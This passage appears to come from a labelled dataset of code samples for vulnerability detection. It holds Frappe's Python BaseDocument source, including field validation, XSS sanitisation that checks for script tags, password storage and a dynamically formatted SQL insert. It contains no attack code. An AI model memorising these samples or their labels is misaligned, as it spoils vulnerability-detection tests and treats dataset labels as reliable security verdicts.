frappe.db.add_unique\n\t\tif \"unique_\" in fieldname:\n\t\t\tfieldname = fieldname.split(\"_\", 1)[1]\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif df:\n\t\t\tlabel = df.label\n\n\t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname)))\n\n\t\t# this is used to preserve traceback\n\t\traise frappe.UniqueValidationError(self.doctype, self.name, e)\n\n\tdef update_modified(self):\n\t\t'''Update modified timestamp'''\n\t\tself.set(\"modified\", now())\n\t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)\n\n\tdef _fix_numeric_types(self):\n\t\tfor df in self.meta.get(\"fields\"):\n\t\t\tif df.fieldtype == \"Check\":\n\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\telif self.get(df.fieldname) is not None:\n\t\t\t\tif df.fieldtype == \"Int\":\n\t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\t\telif df.fieldtype in (\"Float\", \"Currency\", \"Percent\"):\n\t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname)))\n\n\t\tif self.docstatus is not None:\n\t\t\tself.docstatus = cint(self.docstatus)\n\n\tdef _get_missing_mandatory_fields(self):\n\t\t\"\"\"Get mandatory fields that do not have any values\"\"\"\n\t\tdef get_msg(df):\n\t\t\tif df.fieldtype == \"Table\":\n\t\t\t\treturn \"{}: {}: {}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label))\n\n\t\t\telif self.parentfield:\n\t\t\t\treturn \"{}: {} {} #{}: {}: {}\".format(_(\"Error\"), frappe.bold(_(self.doctype)),\n\t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label))\n\n\t\t\telse:\n\t\t\t\treturn _(\"Error: Value missing for {0}: {1}\").format(_(df.parent), _(df.label))\n\n\t\tmissing = []\n\n\t\tfor df in self.meta.get(\"fields\", {\"reqd\": ('=', 1)}):\n\t\t\tif self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():\n\t\t\t\tmissing.append((df.fieldname, get_msg(df)))\n\n\t\t# check for missing parent and parenttype\n\t\tif self.meta.istable:\n\t\t\tfor fieldname in (\"parent\", \"parenttype\"):\n\t\t\t\tif not self.get(fieldname):\n\t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname))))\n\n\t\treturn missing\n\n\tdef get_invalid_links(self, is_submittable=False):\n\t\t'''Returns list of invalid links and also updates fetch values if not set'''\n\t\tdef get_msg(df, docname):\n\t\t\tif self.parentfield:\n\t\t\t\treturn \"{} #{}: {}: {}\".format(_(\"Row\"), self.idx, _(df.label), docname)\n\t\t\telse:\n\t\t\t\treturn \"{}: {}\".format(_(df.label), docname)\n\n\t\tinvalid_links = []\n\t\tcancelled_links = []\n\n\t\tfor df in (self.meta.get_link_fields()\n\t\t\t\t+ self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Dynamic Link\")})):\n\t\t\tdocname = self.get(df.fieldname)\n\n\t\t\tif docname:\n\t\t\t\tif df.fieldtype==\"Link\":\n\t\t\t\t\tdoctype = df.options\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field {0}\").format(df.fieldname))\n\t\t\t\telse:\n\t\t\t\t\tdoctype = self.get(df.options)\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options)))\n\n\t\t\t\t# MySQL is case insensitive. Preserve case of the original docname in the Link Field.\n\n\t\t\t\t# get a map of values ot fetch along with this link query\n\t\t\t\t# that are mapped as link_fieldname.source_fieldname in Options of\n\t\t\t\t# Readonly or Data or Text type fields\n\n\t\t\t\tfields_to_fetch = [\n\t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname)\n\t\t\t\t\tif\n\t\t\t\t\t\tnot _df.get('fetch_if_empty')\n\t\t\t\t\t\tor (_df.get('fetch_if_empty') and not self.get(_df.fieldname))\n\t\t\t\t]\n\n\t\t\t\tif not fields_to_fetch:\n\t\t\t\t\t# cache a single value type\n\t\t\t\t\tvalues = frappe._dict(name=frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\t'name', cache=True))\n\t\t\t\telse:\n\t\t\t\t\tvalues_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]\n\t\t\t\t\t\tfor _df in fields_to_fetch]\n\n\t\t\t\t\t# don't cache if fetching other values too\n\t\t\t\t\tvalues = frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\tvalues_to_fetch, as_dict=True)\n\n\t\t\t\tif frappe.get_meta(doctype).issingle:\n\t\t\t\t\tvalues.name = doctype\n\n\t\t\t\tif values:\n\t\t\t\t\tsetattr(self, df.fieldname, values.name)\n\n\t\t\t\t\tfor _df in fields_to_fetch:\n\t\t\t\t\t\tif self.is_new() or self.docstatus != 1 or _df.allow_on_submit:\n\t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])\n\n\t\t\t\t\tnotify_link_count(doctype, docname)\n\n\t\t\t\t\tif not values.name:\n\t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\t\t\t\telif (df.fieldname != \"amended_from\"\n\t\t\t\t\t\tand (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable\n\t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2):\n\n\t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\treturn invalid_links, cancelled_links\n\n\tdef _validate_selects(self):\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\n\t\tfor df in self.meta.get_select_fields():\n\t\t\tif df.fieldname==\"naming_series\" or not (self.get(df.fieldname) and df.options):\n\t\t\t\tcontinue\n\n\t\t\toptions = (df.options or \"\").split(\"\\n\")\n\n\t\t\t# if only empty options\n\t\t\tif not filter(None, options):\n\t\t\t\tcontinue\n\n\t\t\t# strip and set\n\t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip())\n\t\t\tvalue = self.get(df.fieldname)\n\n\t\t\tif value not in options and not (frappe.flags.in_test and value.startswith(\"_T-\")):\n\t\t\t\t# show an elaborate message\n\t\t\t\tprefix = _(\"Row #{0}:\").format(self.idx) if self.get(\"parentfield\") else \"\"\n\t\t\t\tlabel = _(self.meta.get_label(df.fieldname))\n\t\t\t\tcomma_options = '\", \"'.join(_(each) for each in options)\n\n\t\t\t\tfrappe.throw(_('{0} {1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label,\n\t\t\t\t\tvalue, comma_options))\n\n\tdef _validate_constants(self):\n\t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:\n\t\t\treturn\n\n\t\tconstants = [d.fieldname for d in self.meta.get(\"fields\", {\"set_only_once\": ('=',1)})]\n\t\tif constants:\n\t\t\tvalues = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)\n\n\t\tfor fieldname in constants:\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\t# This conversion to string only when fieldtype is Date\n\t\t\tif df.fieldtype == 'Date' or df.fieldtype == 'Datetime':\n\t\t\t\tvalue = str(values.get(fieldname))\n\n\t\t\telse:\n\t\t\t\tvalue  = values.get(fieldname)\n\n\t\t\tif self.get(fieldname) != value:\n\t\t\t\tfrappe.throw(_(\"Value cannot be changed for {0}\").format(self.meta.get_label(fieldname)),\n\t\t\t\t\tfrappe.CannotChangeConstantError)\n\n\tdef _validate_length(self):\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tif self.meta.issingle:\n\t\t\t# single doctype value type is mediumtext\n\t\t\treturn\n\n\t\tcolumn_types_to_check_length = ('varchar', 'int', 'bigint')\n\n\t\tfor fieldname, value in iteritems(self.get_valid_dict()):\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\tif not df or df.fieldtype == 'Check':\n\t\t\t\t# skip standard fields and Check fields\n\t\t\t\tcontinue\n\n\t\t\tcolumn_type = type_map[df.fieldtype][0] or None\n\t\t\tdefault_column_max_length = type_map[df.fieldtype][1] or None\n\n\t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length:\n\t\t\t\tmax_length = cint(df.get(\"length\")) or cint(default_column_max_length)\n\n\t\t\t\tif len(cstr(value)) > max_length:\n\t\t\t\t\tif self.parentfield and self.idx:\n\t\t\t\t\t\treference = _(\"{0}, Row {1}\").format(_(self.doctype), self.idx)\n\n\t\t\t\t\telse:\n\t\t\t\t\t\treference = \"{0} {1}\".format(_(self.doctype), self.name)\n\n\t\t\t\t\tfrappe.throw(_(\"{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}\")\\\n\t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))\n\n\tdef _validate_update_after_submit(self):\n\t\t# get the full doc with children\n\t\tdb_values = frappe.get_doc(self.doctype, self.name).as_dict()\n\n\t\tfor key in self.as_dict():\n\t\t\tdf = self.meta.get_field(key)\n\t\t\tdb_value = db_values.get(key)\n\n\t\t\tif df and not df.allow_on_submit and (self.get(key) or db_value):\n\t\t\t\tif df.fieldtype==\"Table\":\n\t\t\t\t\t# just check if the table size has changed\n\t\t\t\t\t# individual fields will be checked in the loop for children\n\t\t\t\t\tself_value = len(self.get(key))\n\t\t\t\t\tdb_value = len(db_value)\n\n\t\t\t\telse:\n\t\t\t\t\tself_value = self.get_value(key)\n\n\t\t\t\tif self_value != db_value:\n\t\t\t\t\tfrappe.throw(_(\"Not allowed to change {0} after submission\").format(df.label),\n\t\t\t\t\t\tfrappe.UpdateAfterSubmitError)\n\n\tdef _sanitize_content(self):\n\t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS.\n\n\t\t\t- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'\n\t\t\"\"\"\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tfor fieldname, value in self.get_valid_dict().items():\n\t\t\tif not value or not isinstance(value, string_types):\n\t\t\t\tcontinue\n\n\t\t\tvalue = frappe.as_unicode(value)\n\n\t\t\tif (u\"<\" not in value and u\">\" not in value):\n\t\t\t\t# doesn't look like html so no need\n\t\t\t\tcontinue\n\n\t\t\telif \"<!-- markdown -->\" in value and not (\"<script\" in value or \"javascript:\" in value):\n\t\t\t\t# should be handled separately via the markdown converter function\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tsanitized_value = value\n\n\t\t\tif df and df.get(\"fieldtype\") in (\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\":\n\t\t\t\tsanitized_value = sanitize_email(value)\n\n\t\t\telif df and (df.get(\"ignore_xss_filter\")\n\t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n\n\t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n\t\t\t\t\t\tor self.docstatus==2\n\t\t\t\t\t\tor (self.docstatus==1 and not df.get(\"allow_on_submit\"))):\n\t\t\t\tcontinue\n\n\t\t\telse:\n\t\t\t\tsanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')\n\n\t\t\tself.set(fieldname, sanitized_value)\n\n\tdef _save_passwords(self):\n\t\t'''Save password field values in __Auth table'''\n\t\tif self.flags.ignore_save_passwords is True:\n\t\t\treturn\n\n\t\tfor df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):\n\t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue\n\t\t\tnew_password = self.get(df.fieldname)\n\t\t\tif new_password and not self.is_dummy_password(new_password):\n\t\t\t\t# is not a dummy password like '*****'\n\t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname)\n\n\t\t\t\t# set dummy password like '*****'\n\t\t\t\tself.set(df.fieldname, '*'*len(new_password))\n\n\tdef get_password(self, fieldname='password', raise_exception=True):\n\t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):\n\t\t\treturn self.get(fieldname)\n\n\t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)\n\n\tdef is_dummy_password(self, pwd):\n\t\treturn ''.join(set(pwd))=='*'\n\n\tdef precision(self, fieldname, parentfield=None):\n\t\t\"\"\"Returns float precision for a particular field (or get global default).\n\n\t\t:param fieldname: Fieldname for which precision is required.\n\t\t:param parentfield: If fieldname is in child table.\"\"\"\n\t\tfrom frappe.model.meta import get_field_precision\n\n\t\tif parentfield and not isinstance(parentfield, string_types):\n\t\t\tparentfield = parentfield.parentfield\n\n\t\tcache_key = parentfield or \"main\"\n\n\t\tif not hasattr(self, \"_precision\"):\n\t\t\tself._precision = frappe._dict()\n\n\t\tif cache_key not in self._precision:\n\t\t\tself._precision[cache_key] = frappe._dict()\n\n\t\tif fieldname not in self._precision[cache_key]:\n\t\t\tself._precision[cache_key][fieldname] = None\n\n\t\t\tdoctype = self.meta.get_field(parentfield).options if parentfield else self.doctype\n\t\t\tdf = frappe.get_meta(doctype).get_field(fieldname)\n\n\t\t\tif df.fieldtype in (\"Currency\", \"Float\", \"Percent\"):\n\t\t\t\tself._precision[cache_key][fieldname] = get_field_precision(df, self)\n\n\t\treturn self._precision[cache_key][fieldname]\n\n\n\tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):\n\t\tfrom frappe.utils.formatters import format_value\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif not df and fieldname in default_fields:\n\t\t\tfrom frappe.model.meta import get_default_df\n\t\t\tdf = get_default_df(fieldname)\n\n\t\tval = self.get(fieldname)\n\n\t\tif translated:\n\t\t\tval = _(val)\n\n\t\tif absolute_value and isinstance(val, (int, float)):\n\t\t\tval = abs(self.get(fieldname))\n\n\t\tif not doc:\n\t\t\tdoc = getattr(self, \"parent_doc\", None) or self\n\n\t\treturn format_value(val, df=df, doc=doc, currency=currency)\n\n\tdef is_print_hide(self, fieldname, df=None, for_print=True):\n\t\t\"\"\"Returns true if fieldname is to be hidden for print.\n\n\t\tPrint Hide can be set via the Print Format Builder or in the controller as a list\n\t\tof hidden fields. Example\n\n\t\t\tclass MyDoc(Document):\n\t\t\t\tdef __setup__(self):\n\t\t\t\t\tself.print_hide = [\"field1\", \"field2\"]\n\n\t\t:param fieldname: Fieldname to be checked if hidden.\n\t\t\"\"\"\n\t\tmeta_df = self.meta.get_field(fieldname)\n\t\tif meta_df and meta_df.get(\"__print_hide\"):\n\t\t\treturn True\n\n\t\tprint_hide = 0\n\n\t\tif self.get(fieldname)==0 and not self.meta.istable:\n\t\t\tprint_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )\n\n\t\tif not print_hide:\n\t\t\tif df and df.print_hide is not None:\n\t\t\t\tprint_hide = df.print_hide\n\t\t\telif meta_df:\n\t\t\t\tprint_hide = meta_df.print_hide\n\n\t\treturn print_hide\n\n\tdef in_format_data(self, fieldname):\n\t\t\"\"\"Returns True if shown via Print Format::`format_data` property.\n\t\t\tCalled from within standard print format.\"\"\"\n\t\tdoc = getattr(self, \"parent_doc\", self)\n\n\t\tif hasattr(doc, \"format_data_map\"):\n\t\t\treturn fieldname in doc.format_data_map\n\t\telse:\n\t\t\treturn True\n\n\tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):\n\t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\"\n\t\tto_reset = []\n\n\t\tfor df in high_permlevel_fields:\n\t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:\n\t\t\t\tto_reset.append(df)\n\n\t\tif to_reset:\n\t\t\tif self.is_new():\n\t\t\t\t# if new, set default value\n\t\t\t\tref_doc = frappe.new_doc(self.doctype)\n\t\t\telse:\n\t\t\t\t# get values from old doc\n\t\t\t\tif self.get('parent_doc'):\n\t\t\t\t\tself.parent_doc.get_latest()\n\t\t\t\t\tref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]\n\t\t\t\telse:\n\t\t\t\t\tref_doc = self.get_latest()\n\n\t\t\tfor df in to_reset:\n\t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname))\n\n\tdef get_value(self, fieldname):\n\t\tdf = self.meta.get_field(fieldname)\n\t\tval = self.get(fieldname)\n\n\t\treturn self.cast(val, df)\n\n\tdef cast(self, value, df):\n\t\treturn cast_fieldtype(df.fieldtype, value)\n\n\tdef _extract_images_from_text_editor(self):\n\t\tfrom frappe.utils.file_manager import extract_images_from_doc\n\t\tif self.doctype != \"DocType\":\n\t\t\tfor df in self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Text Editor\")}):\n\t\t\t\textract_images_from_doc(self, df.fieldname)\n\ndef _filter(data, filters, limit=None):\n\t\"\"\"pass filters as:\n\t\t{\"key\": \"val\", \"key\": [\"!=\", \"val\"],\n\t\t\"key\": [\"in\", \"val\"], \"key\": [\"not in\", \"val\"], \"key\": \"^val\",\n\t\t\"key\" : True (exists), \"key\": False (does not exist) }\"\"\"\n\n\tout, _filters = [], {}\n\n\tif not data:\n\t\treturn out\n\n\t# setup filters as tuples\n\tif filters:\n\t\tfor f in filters:\n\t\t\tfval = filters[f]\n\n\t\t\tif not isinstance(fval, (tuple, list)):\n\t\t\t\tif fval is True:\n\t\t\t\t\tfval = (\"not None\", fval)\n\t\t\t\telif fval is False:\n\t\t\t\t\tfval = (\"None\", fval)\n\t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"):\n\t\t\t\t\tfval = (\"^\", fval[1:])\n\t\t\t\telse:\n\t\t\t\t\tfval = (\"=\", fval)\n\n\t\t\t_filters[f] = fval\n\n\tfor d in data:\n\t\tadd = True\n\t\tfor f, fval in iteritems(_filters):\n\t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]):\n\t\t\t\tadd = False\n\t\t\t\tbreak\n\n\t\tif add:\n\t\t\tout.append(d)\n\t\t\tif limit and (len(out)-1)==limit:\n\t\t\t\tbreak\n\n\treturn out\n/n/n/n", "label": 0}, {"id": "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "code": "/frappe/model/base_document.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\nfrom six import iteritems, string_types\nimport datetime\nimport frappe, sys\nfrom frappe import _\nfrom frappe.utils import (cint, flt, now, cstr, strip_html,\n\tsanitize_html, sanitize_email, cast_fieldtype)\nfrom frappe.model import default_fields\nfrom frappe.model.naming import set_new_name\nfrom frappe.model.utils.link_count import notify_link_count\nfrom frappe.modules import load_doctype_module\nfrom frappe.model import display_fieldtypes\nfrom frappe.model.db_schema import type_map, varchar_len\nfrom frappe.utils.password import get_decrypted_password, set_encrypted_password\n\n_classes = {}\n\ndef get_controller(doctype):\n\t\"\"\"Returns the **class** object of the given DocType.\n\tFor `custom` type, returns `frappe.model.document.Document`.\n\n\t:param doctype: DocType name as string.\"\"\"\n\tfrom frappe.model.document import Document\n\tglobal _classes\n\n\tif not doctype in _classes:\n\t\tmodule_name, custom = frappe.db.get_value(\"DocType\", doctype, (\"module\", \"custom\"), cache=True) \\\n\t\t\tor [\"Core\", False]\n\n\t\tif custom:\n\t\t\t_class = Document\n\t\telse:\n\t\t\tmodule = load_doctype_module(doctype, module_name)\n\t\t\tclassname = doctype.replace(\" \", \"\").replace(\"-\", \"\")\n\t\t\tif hasattr(module, classname):\n\t\t\t\t_class = getattr(module, classname)\n\t\t\t\tif issubclass(_class, BaseDocument):\n\t\t\t\t\t_class = getattr(module, classname)\n\t\t\t\telse:\n\t\t\t\t\traise ImportError(doctype)\n\t\t\telse:\n\t\t\t\traise ImportError(doctype)\n\t\t_classes[doctype] = _class\n\n\treturn _classes[doctype]\n\nclass BaseDocument(object):\n\tignore_in_getter = (\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\")\n\n\tdef __init__(self, d):\n\t\tself.update(d)\n\t\tself.dont_update_if_missing = []\n\n\t\tif hasattr(self, \"__setup__\"):\n\t\t\tself.__setup__()\n\n\t@property\n\tdef meta(self):\n\t\tif not hasattr(self, \"_meta\"):\n\t\t\tself._meta = frappe.get_meta(self.doctype)\n\n\t\treturn self._meta\n\n\tdef update(self, d):\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\n\t\t# first set default field values of base document\n\t\tfor key in default_fields:\n\t\t\tif key in d:\n\t\t\t\tself.set(key, d.get(key))\n\n\t\tfor key, value in iteritems(d):\n\t\t\tself.set(key, value)\n\n\t\treturn self\n\n\tdef update_if_missing(self, d):\n\t\tif isinstance(d, BaseDocument):\n\t\t\td = d.get_valid_dict()\n\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\t\tfor key, value in iteritems(d):\n\t\t\t# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value\n\t\t\tif (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):\n\t\t\t\tself.set(key, value)\n\n\tdef get_db_value(self, key):\n\t\treturn frappe.db.get_value(self.doctype, self.name, key)\n\n\tdef get(self, key=None, filters=None, limit=None, default=None):\n\t\tif key:\n\t\t\tif isinstance(key, dict):\n\t\t\t\treturn _filter(self.get_all_children(), key, limit=limit)\n\t\t\tif filters:\n\t\t\t\tif isinstance(filters, dict):\n\t\t\t\t\tvalue = _filter(self.__dict__.get(key, []), filters, limit=limit)\n\t\t\t\telse:\n\t\t\t\t\tdefault = filters\n\t\t\t\t\tfilters = None\n\t\t\t\t\tvalue = self.__dict__.get(key, default)\n\t\t\telse:\n\t\t\t\tvalue = self.__dict__.get(key, default)\n\n\t\t\tif value is None and key not in self.ignore_in_getter \\\n\t\t\t\tand key in (d.fieldname for d in self.meta.get_table_fields()):\n\t\t\t\tself.set(key, [])\n\t\t\t\tvalue = self.__dict__.get(key)\n\n\t\t\treturn value\n\t\telse:\n\t\t\treturn self.__dict__\n\n\tdef getone(self, key, filters=None):\n\t\treturn self.get(key, filters=filters, limit=1)[0]\n\n\tdef set(self, key, value, as_value=False):\n\t\tif isinstance(value, list) and not as_value:\n\t\t\tself.__dict__[key] = []\n\t\t\tself.extend(key, value)\n\t\telse:\n\t\t\tself.__dict__[key] = value\n\n\tdef delete_key(self, key):\n\t\tif key in self.__dict__:\n\t\t\tdel self.__dict__[key]\n\n\tdef append(self, key, value=None):\n\t\tif value==None:\n\t\t\tvalue={}\n\t\tif isinstance(value, (dict, BaseDocument)):\n\t\t\tif not self.__dict__.get(key):\n\t\t\t\tself.__dict__[key] = []\n\t\t\tvalue = self._init_child(value, key)\n\t\t\tself.__dict__[key].append(value)\n\n\t\t\t# reference parent document\n\t\t\tvalue.parent_doc = self\n\n\t\t\treturn value\n\t\telse:\n\n\t\t\t# metaclasses may have arbitrary lists\n\t\t\t# which we can ignore\n\t\t\tif (getattr(self, '_metaclass', None)\n\t\t\t\tor self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):\n\t\t\t\treturn value\n\n\t\t\traise ValueError(\n\t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not {2} ({3})'.format(key,\n\t\t\t\t\tself.name, str(type(value))[1:-1], value)\n\t\t\t)\n\n\tdef extend(self, key, value):\n\t\tif isinstance(value, list):\n\t\t\tfor v in value:\n\t\t\t\tself.append(key, v)\n\t\telse:\n\t\t\traise ValueError\n\n\tdef remove(self, doc):\n\t\tself.get(doc.parentfield).remove(doc)\n\n\tdef _init_child(self, value, key):\n\t\tif not self.doctype:\n\t\t\treturn value\n\t\tif not isinstance(value, BaseDocument):\n\t\t\tif \"doctype\" not in value:\n\t\t\t\tvalue[\"doctype\"] = self.get_table_field_doctype(key)\n\t\t\t\tif not value[\"doctype\"]:\n\t\t\t\t\traise AttributeError(key)\n\t\t\tvalue = get_controller(value[\"doctype\"])(value)\n\t\t\tvalue.init_valid_columns()\n\n\t\tvalue.parent = self.name\n\t\tvalue.parenttype = self.doctype\n\t\tvalue.parentfield = key\n\n\t\tif value.docstatus is None:\n\t\t\tvalue.docstatus = 0\n\n\t\tif not getattr(value, \"idx\", None):\n\t\t\tvalue.idx = len(self.get(key) or []) + 1\n\n\t\tif not getattr(value, \"name\", None):\n\t\t\tvalue.__dict__['__islocal'] = 1\n\n\t\treturn value\n\n\tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False):\n\t\td = frappe._dict()\n\t\tfor fieldname in self.meta.get_valid_columns():\n\t\t\td[fieldname] = self.get(fieldname)\n\n\t\t\t# if no need for sanitization and value is None, continue\n\t\t\tif not sanitize and d[fieldname] is None:\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tif df:\n\t\t\t\tif df.fieldtype==\"Check\":\n\t\t\t\t\tif d[fieldname]==None:\n\t\t\t\t\t\td[fieldname] = 0\n\n\t\t\t\t\telif (not isinstance(d[fieldname], int) or d[fieldname] > 1):\n\t\t\t\t\t\td[fieldname] = 1 if cint(d[fieldname]) else 0\n\n\t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int):\n\t\t\t\t\td[fieldname] = cint(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float):\n\t\t\t\t\td[fieldname] = flt(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\":\n\t\t\t\t\t# unique empty field should be set to None\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype != 'Table':\n\t\t\t\t\tfrappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))\n\n\t\t\t\tif convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):\n\t\t\t\t\td[fieldname] = str(d[fieldname])\n\n\t\treturn d\n\n\tdef init_valid_columns(self):\n\t\tfor key in default_fields:\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\t\t\tif key in (\"idx\", \"docstatus\") and self.__dict__[key] is None:\n\t\t\t\tself.__dict__[key] = 0\n\n\t\tfor key in self.get_valid_columns():\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\tdef get_valid_columns(self):\n\t\tif self.doctype not in frappe.local.valid_columns:\n\t\t\tif self.doctype in (\"DocField\", \"DocPerm\") and self.parent in (\"DocType\", \"DocField\", \"DocPerm\"):\n\t\t\t\tfrom frappe.model.meta import get_table_columns\n\t\t\t\tvalid = get_table_columns(self.doctype)\n\t\t\telse:\n\t\t\t\tvalid = self.meta.get_valid_columns()\n\n\t\t\tfrappe.local.valid_columns[self.doctype] = valid\n\n\t\treturn frappe.local.valid_columns[self.doctype]\n\n\tdef is_new(self):\n\t\treturn self.get(\"__islocal\")\n\n\tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):\n\t\tdoc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)\n\t\tdoc[\"doctype\"] = self.doctype\n\t\tfor df in self.meta.get_table_fields():\n\t\t\tchildren = self.get(df.fieldname) or []\n\t\t\tdoc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]\n\n\t\tif no_nulls:\n\t\t\tfor k in list(doc):\n\t\t\t\tif doc[k] is None:\n\t\t\t\t\tdel doc[k]\n\n\t\tif no_default_fields:\n\t\t\tfor k in list(doc):\n\t\t\t\tif k in default_fields:\n\t\t\t\t\tdel doc[k]\n\n\t\tfor key in (\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"):\n\t\t\tif self.get(key):\n\t\t\t\tdoc[key] = self.get(key)\n\n\t\treturn doc\n\n\tdef as_json(self):\n\t\treturn frappe.as_json(self.as_dict())\n\n\tdef get_table_field_doctype(self, fieldname):\n\t\treturn self.meta.get_field(fieldname).options\n\n\tdef get_parentfield_of_doctype(self, doctype):\n\t\tfieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]\n\t\treturn fieldname[0] if fieldname else None\n\n\tdef db_insert(self):\n\t\t\"\"\"INSERT the document (with valid columns) in the database.\"\"\"\n\t\tif not self.name:\n\t\t\t# name will be set by document class in most cases\n\t\t\tset_new_name(self)\n\n\t\tif not self.creation:\n\t\t\tself.creation = self.modified = now()\n\t\t\tself.created_by = self.modifield_by = frappe.session.user\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\tcolumns = list(d)\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}`\n\t\t\t\t({columns}) values ({values})\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tcolumns = \", \".join([\"`\"+c+\"`\" for c in columns]),\n\t\t\t\t\tvalues = \", \".join([\"%s\"] * len(columns))\n\t\t\t\t), list(d.values()))\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062:\n\t\t\t\tif \"PRIMARY\" in cstr(e.args[1]):\n\t\t\t\t\tif self.meta.autoname==\"hash\":\n\t\t\t\t\t\t# hash collision? try again\n\t\t\t\t\t\tself.name = 